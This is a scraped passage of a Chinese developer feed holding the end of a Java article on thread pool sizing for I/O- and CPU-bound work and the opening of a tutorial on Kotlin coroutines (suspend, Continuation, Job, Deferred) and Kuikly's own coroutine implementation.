<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadPoolConfigDemo</span> {
    
    <span class="hljs-comment">// 💤 I/O密集型任务：线程数可以设置较大</span>
    <span class="hljs-keyword">public</span> ExecutorService <span class="hljs-title function_">createIoIntensiveThreadPool</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 公式：线程数 = CPU核心数 × (1 + 平均等待时间/平均计算时间)</span>
        <span class="hljs-comment">// 对于I/O密集型，通常可以设置为 2 × CPU核心数 到几十个线程</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">corePoolSize</span> <span class="hljs-operator">=</span> Runtime.getRuntime().availableProcessors() * <span class="hljs-number">2</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">maxPoolSize</span> <span class="hljs-operator">=</span> <span class="hljs-number">50</span>;  <span class="hljs-comment">// 可以根据实际情况调整</span>
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
            corePoolSize,      <span class="hljs-comment">// 核心线程数</span>
            maxPoolSize,       <span class="hljs-comment">// 最大线程数</span>
            <span class="hljs-number">60L</span>, TimeUnit.SECONDS,  <span class="hljs-comment">// 空闲线程存活时间</span>
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">100</span>),  <span class="hljs-comment">// 任务队列</span>
            Executors.defaultThreadFactory(),
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.AbortPolicy()
        );
    }
    
    <span class="hljs-comment">// 🔥 CPU密集型任务：线程数不宜过多</span>
    <span class="hljs-keyword">public</span> ExecutorService <span class="hljs-title function_">createCpuIntensiveThreadPool</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 公式：线程数 = CPU核心数 + 1</span>
        <span class="hljs-comment">// 避免过多的上下文切换开销</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">corePoolSize</span> <span class="hljs-operator">=</span> Runtime.getRuntime().availableProcessors();
        <span class="hljs-type">int</span> <span class="hljs-variable">maxPoolSize</span> <span class="hljs-operator">=</span> corePoolSize + <span class="hljs-number">1</span>;  <span class="hljs-comment">// 稍微留点余量</span>
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
            corePoolSize,      <span class="hljs-comment">// 核心线程数 ≈ CPU核心数</span>
            maxPoolSize,       <span class="hljs-comment">// 最大线程数稍多一点</span>
            <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">100</span>),
            Executors.defaultThreadFactory(),
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.AbortPolicy()
        );
    }
}
</code></pre>
<h4 data-id="heading-27">7.2 自适应配置方案（可选）</h4>
<p>在某些场景下，我们可以根据任务的实际执行特征动态调整线程池配置：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdaptiveThreadPoolManager</span> {
    
    <span class="hljs-comment">// 监控任务执行特征</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TaskMetrics</span> {
        <span class="hljs-type">long</span> cpuTime;      <span class="hljs-comment">// CPU计算时间</span>
        <span class="hljs-type">long</span> waitTime;     <span class="hljs-comment">// 等待时间（I/O、锁等）</span>
        <span class="hljs-type">long</span> totalTime;    <span class="hljs-comment">// 总执行时间</span>
        
        <span class="hljs-type">double</span> <span class="hljs-title function_">getIoRatio</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> (<span class="hljs-type">double</span>) waitTime / totalTime;
        }
    }
    
    <span class="hljs-comment">// 根据历史数据动态调整线程池</span>
    <span class="hljs-keyword">public</span> ExecutorService <span class="hljs-title function_">createAdaptiveThreadPool</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 获取系统CPU核心数</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">cpuCores</span> <span class="hljs-operator">=</span> Runtime.getRuntime().availableProcessors();
        
        <span class="hljs-comment">// 收集任务执行特征</span>
        List&lt;TaskMetrics&gt; metrics = collectTaskMetrics();
        <span class="hljs-type">double</span> <span class="hljs-variable">avgIoRatio</span> <span class="hljs-operator">=</span> calculateAverageIoRatio(metrics);
        
        <span class="hljs-comment">// 根据I/O比例调整线程数</span>
        <span class="hljs-type">int</span> optimalThreads;
        <span class="hljs-keyword">if</span> (avgIoRatio &gt; <span class="hljs-number">0.8</span>) {
            <span class="hljs-comment">// I/O密集型：80%以上时间在等待</span>
            optimalThreads = cpuCores * <span class="hljs-number">4</span>;  <span class="hljs-comment">// 可以设置较多线程</span>
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (avgIoRatio &gt; <span class="hljs-number">0.5</span>) {
            <span class="hljs-comment">// 混合型任务</span>
            optimalThreads = cpuCores * <span class="hljs-number">2</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// CPU密集型：大部分时间在计算</span>
            optimalThreads = cpuCores;  <span class="hljs-comment">// 不宜过多</span>
        }
        
        <span class="hljs-keyword">return</span> Executors.newFixedThreadPool(optimalThreads);
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-28">8. 实战应用：接口中的CPU使用分析</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
    
    <span class="hljs-meta">@GetMapping("/user/{id}")</span>
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String id)</span> {
        <span class="hljs-comment">// ✅ 使用CPU：参数解析、验证、逻辑处理</span>
        validateId(id);                         <span class="hljs-comment">// 约0.1ms CPU</span>
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> processUserLogic(id);       <span class="hljs-comment">// 约0.2ms CPU</span>
        
        <span class="hljs-comment">// ❌ 不使用CPU：等待数据库</span>
        <span class="hljs-type">UserDetail</span> <span class="hljs-variable">detail</span> <span class="hljs-operator">=</span> userRepository.findDetailById(id); <span class="hljs-comment">// 约10ms 等待I/O</span>
        
        <span class="hljs-comment">// ✅ 使用CPU：数据处理</span>
        user.setDetail(detail);                 <span class="hljs-comment">// 约0.05ms CPU</span>
        <span class="hljs-keyword">return</span> user;                            <span class="hljs-comment">// 约0.05ms CPU</span>
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">validateId</span><span class="hljs-params">(String id)</span> {
        <span class="hljs-comment">// ✅ 使用CPU：字符串操作、逻辑判断</span>
        <span class="hljs-keyword">if</span> (id == <span class="hljs-literal">null</span> || id.length() != <span class="hljs-number">10</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"Invalid ID"</span>);
        }
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-29">9. 优化技巧与危险操作</h3>
<h4 data-id="heading-30">9.1 常见的CPU优化技巧</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OptimizationTips</span> {
    
    <span class="hljs-comment">// 1. 避免在循环中创建对象</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">badPractice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"Hello "</span> + i); <span class="hljs-comment">// ❌ 每次循环创建新对象</span>
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">goodPractice</span><span class="hljs-params">()</span> {
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
            sb.append(<span class="hljs-string">"Hello "</span>).append(i);             <span class="hljs-comment">// ✅ 复用对象</span>
        }
    }
    
    <span class="hljs-comment">// 2. 使用更高效的算法</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">useEfficientCollections</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ✅ 根据场景选择合适的集合</span>
        Set&lt;String&gt; uniqueNames = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();     <span class="hljs-comment">// 快速查找</span>
        List&lt;String&gt; orderedList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <span class="hljs-comment">// 快速随机访问</span>
    }
}
</code></pre>
<h4 data-id="heading-31">9.2 ⚠️ 危险操作提醒</h4>
<p><strong>特别注意：</strong> 永不结束的线程可能造成严重的性能问题，因为CPU线程会一直被占用而无法释放。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 情况1：安全，影响小</span>
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
    <span class="hljs-type">Thread</span> <span class="hljs-variable">safeThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
        <span class="hljs-comment">// 没有代码 = 立即结束 ✅</span>
    });
}

<span class="hljs-comment">// 情况2：危险，影响大  </span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">dangerousThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
        <span class="hljs-comment">// 没有实际工作，但线程永不结束 ❌</span>
        <span class="hljs-comment">// 导致一个CPU线程被永久占用</span>
    }
});
</code></pre>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入理解 Kotlin 协程：从语法到 Kuikly 实战]]></title>    <link>https://juejin.cn/post/7602928386596093978</link>    <guid>https://juejin.cn/post/7602928386596093978</guid>    <pubDate>2026-02-05T03:49:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602928386596093978" data-draft-id="7602914378388504586" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入理解 Kotlin 协程：从语法到 Kuikly 实战"/> <meta itemprop="keywords" content="Kotlin"/> <meta itemprop="datePublished" content="2026-02-05T03:49:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="我有与与症"/> <meta itemprop="url" content="https://juejin.cn/user/4466629837071787"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入理解 Kotlin 协程：从语法到 Kuikly 实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4466629837071787/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    我有与与症
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T03:49:38.000Z" title="Thu Feb 05 2026 03:49:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文面向 Kotlin 协程初学者，从底层原理到实战应用，全面讲解协程在 Kuikly 中的使用</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">引言：为什么需要协程</h2>
<p>想象一个场景：你需要先获取用户信息，再根据用户信息获取订单列表，最后更新 UI。</p>
<p><strong>传统回调方式：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 回调地狱 😱</span>
getUserInfo { user -&gt;
    getOrderList(user.id) { orders -&gt;
        getOrderDetail(orders[<span class="hljs-number">0</span>].id) { detail -&gt;
            <span class="hljs-comment">// 终于拿到数据了...</span>
            updateUI(detail)
        }
    }
}
</code></pre>
<p>这种代码的问题：</p>
<ol>
<li><strong>嵌套层级深</strong>：难以阅读和维护</li>
<li><strong>错误处理困难</strong>：每层都需要处理错误</li>
<li><strong>无法方便地取消</strong>：如果用户离开页面，这些回调可能仍在执行</li>
</ol>
<p><strong>协程方式：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 清晰优雅 ✨</span>
lifecycleScope.launch {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">val</span> user = getUserInfo()
        <span class="hljs-keyword">val</span> orders = getOrderList(user.id)
        <span class="hljs-keyword">val</span> detail = getOrderDetail(orders[<span class="hljs-number">0</span>].id)
        updateUI(detail)
    } <span class="hljs-keyword">catch</span> (e: Exception) {
        showError(e)
    }
}
</code></pre>
<p>协程让异步代码看起来像同步代码，这就是它的魔力！</p>
<hr/>
<h2 data-id="heading-1">第一部分：协程的本质</h2>
<h3 data-id="heading-2">什么是协程</h3>
<p><strong>协程（Coroutine）</strong>= <strong>Co</strong>（协作）+ <strong>Routine</strong>（例程/函数）</p>
<p>简单说，协程是一种<strong>可以暂停和恢复执行的函数</strong>。与普通函数不同，协程在执行过程中可以"暂停"，把控制权交给其他代码，等条件满足后再"恢复"执行。</p>
<pre><code class="hljs">┌──────────────────────────────────────────────────────────┐
│                    普通函数执行流程                        │
├──────────────────────────────────────────────────────────┤
│                                                          │
│   开始 ──────────────────────────────────────────► 结束   │
│         （一口气执行完，不能中断）                           │
│                                                          │
└──────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────┐
│                    协程执行流程                            │
├──────────────────────────────────────────────────────────┤
│                                                          │
│   开始 ────► 挂起点1 ····暂停···· 恢复 ────► 挂起点2 ····  │
│                                                          │
│             ····暂停···· 恢复 ──────────────────► 结束    │
│                                                          │
└──────────────────────────────────────────────────────────┘
</code></pre>
<h3 data-id="heading-3">协程 vs 线程</h3>



































<table><thead><tr><th>特性</th><th>线程</th><th>协程</th></tr></thead><tbody><tr><td>调度者</td><td>操作系统</td><td>程序自身</td></tr><tr><td>创建成本</td><td>高（约 1MB 栈内存）</td><td>低（约几十字节）</td></tr><tr><td>切换成本</td><td>高（内核态切换）</td><td>低（用户态切换）</td></tr><tr><td>数量限制</td><td>通常几千个</td><td>可以创建数十万个</td></tr><tr><td>阻塞影响</td><td>阻塞整个线程</td><td>只暂停当前协程</td></tr></tbody></table>
<p><strong>关键区别：阻塞 vs 挂起</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 线程阻塞：整个线程被占用，不能做其他事</span>
Thread.sleep(<span class="hljs-number">1000</span>)  <span class="hljs-comment">// 线程在这 1 秒内什么都不能做</span>

<span class="hljs-comment">// 协程挂起：只是暂停协程，线程可以去执行其他任务</span>
delay(<span class="hljs-number">1000</span>)  <span class="hljs-comment">// 协程暂停，线程可以去执行其他协程</span>
</code></pre>
<h3 data-id="heading-4">挂起函数（suspend）的魔法</h3>
<p><code>suspend</code> 关键字是 Kotlin 协程的核心。它告诉编译器：这个函数可能会暂停执行。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 普通函数</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">normalFunction</span><span class="hljs-params">()</span></span>: String {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"Hello"</span>
}

<span class="hljs-comment">// 挂起函数</span>
<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">suspendFunction</span><span class="hljs-params">()</span></span>: String {
    delay(<span class="hljs-number">1000</span>)  <span class="hljs-comment">// 可以调用其他挂起函数</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">"Hello after 1 second"</span>
}
</code></pre>
<p><strong>suspend 的本质是什么？</strong></p>
<p>编译器会将挂起函数转换为带有 <code>Continuation</code> 参数的函数：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 你写的代码</span>
<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchData</span><span class="hljs-params">()</span></span>: String {
    delay(<span class="hljs-number">1000</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">"data"</span>
}

<span class="hljs-comment">// 编译器转换后（简化版）</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchData</span><span class="hljs-params">(continuation: <span class="hljs-type">Continuation</span>&lt;<span class="hljs-type">String</span>&gt;)</span></span>: Any {
    <span class="hljs-comment">// ... 状态机代码</span>
}
</code></pre>
<p><code>Continuation</code>（续体）就是"接下来要做什么"的封装。这是协程实现的关键，我们稍后会详细讲解。</p>
<hr/>
<h2 data-id="heading-5">第二部分：Kotlin 协程核心概念</h2>
<h3 data-id="heading-6">Continuation：协程的灵魂</h3>
<p><code>Continuation</code> 是 Kotlin 标准库中定义的接口：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Kotlin 标准库中的定义</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Continuation</span>&lt;<span class="hljs-type">in T</span>&gt; {
    <span class="hljs-comment">// 协程的上下文</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">val</span> context: CoroutineContext
    
    <span class="hljs-comment">// 恢复协程执行，传入结果</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">resumeWith</span><span class="hljs-params">(result: <span class="hljs-type">Result</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span>
}
</code></pre>
<p><strong>Continuation 做什么？</strong></p>
<p>它封装了两个东西：</p>
<ol>
<li><strong>协程的上下文</strong>：包含调度器、Job 等信息</li>
<li><strong>恢复执行的能力</strong>：通过 <code>resumeWith</code> 让协程继续运行</li>
</ol>
<p>让我们用一个比喻理解它：</p>
<pre><code class="hljs language-markdown" lang="markdown">想象你在读一本书，读到一半要去做饭：

普通函数：
<span class="hljs-bullet">  -</span> 合上书，做完饭后忘了读到哪里了
  
协程 + Continuation：
<span class="hljs-bullet">  -</span> 在书里夹一个书签（Continuation）
<span class="hljs-bullet">  -</span> 书签记录了：当前页码、你的阅读进度、理解状态
<span class="hljs-bullet">  -</span> 做完饭后，打开书签就能继续读
</code></pre>
<p><strong>两个常用的扩展函数：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 成功恢复</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> Continuation<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">resume</span><span class="hljs-params">(value: <span class="hljs-type">T</span>)</span></span> {
    resumeWith(Result.success(value))
}

<span class="hljs-comment">// 异常恢复</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> Continuation<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">resumeWithException</span><span class="hljs-params">(exception: <span class="hljs-type">Throwable</span>)</span></span> {
    resumeWith(Result.failure(exception))
}
</code></pre>
<h3 data-id="heading-7">CoroutineScope：协程的作用域</h3>
<p><code>CoroutineScope</code> 定义了协程的生命周期范围：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Kuikly 中的定义</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">CoroutineScope</span> {
    <span class="hljs-keyword">val</span> coroutineContext: CoroutineContext
}
</code></pre>
<p><strong>为什么需要作用域？</strong></p>
<p>作用域解决了协程的生命周期管理问题：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 问题：用户离开页面后，协程还在运行</span>
GlobalScope.launch {
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
        delay(<span class="hljs-number">1000</span>)
        updateUI()  <span class="hljs-comment">// 页面都销毁了，还在更新 UI！</span>
    }
}

<span class="hljs-comment">// 解决：使用绑定生命周期的作用域</span>
lifecycleScope.launch {
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
        delay(<span class="hljs-number">1000</span>)
        updateUI()  <span class="hljs-comment">// 页面销毁时，协程自动取消</span>
    }
}
</code></pre>
<h3 data-id="heading-8">Job：协程的生命周期</h3>
<p><code>Job</code> 是协程的句柄，用于管理协程的生命周期：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Kuikly 中的定义</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Job</span> : <span class="hljs-type">CoroutineContext.Element</span> {
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> Key : CoroutineContext.Key&lt;Job&gt;
}
</code></pre>
<p><code>launch</code> 函数返回一个 <code>Job</code>，你可以用它来控制协程：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> job = GlobalScope.launch {
    repeat(<span class="hljs-number">1000</span>) { i -&gt;
        println(<span class="hljs-string">"执行中: <span class="hljs-variable">$i</span>"</span>)
        delay(<span class="hljs-number">500</span>)
    }
}

<span class="hljs-comment">// 稍后取消协程</span>
job.cancel()
</code></pre>
<h3 data-id="heading-9">Deferred：带返回值的协程</h3>
<p><code>Deferred</code> 继承自 <code>Job</code>，额外提供了获取返回值的能力：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Kuikly 中的定义</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Deferred</span>&lt;<span class="hljs-type">out T</span>&gt; : <span class="hljs-type">Job</span> {
    <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">await</span><span class="hljs-params">()</span></span>: T  <span class="hljs-comment">// 等待结果</span>
}
</code></pre>
<p><strong>使用示例：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// async 返回 Deferred</span>
<span class="hljs-keyword">val</span> deferred: Deferred&lt;String&gt; = GlobalScope.async {
    delay(<span class="hljs-number">1000</span>)
    <span class="hljs-string">"计算结果"</span>
}

<span class="hljs-comment">// 在其他地方等待结果</span>
GlobalScope.launch {
    <span class="hljs-keyword">val</span> result = deferred.await()  <span class="hljs-comment">// 挂起直到结果可用</span>
    println(result)  <span class="hljs-comment">// 输出：计算结果</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-10">第三部分：Kuikly 协程实现剖析</h2>
<h3 data-id="heading-11">为什么 Kuikly 要自己实现协程</h3>
<p>Kuikly 实现了一套<strong>简化版的协程系统</strong>，而不是直接使用 <code>kotlinx.coroutines</code> 库。原因如下：</p>






























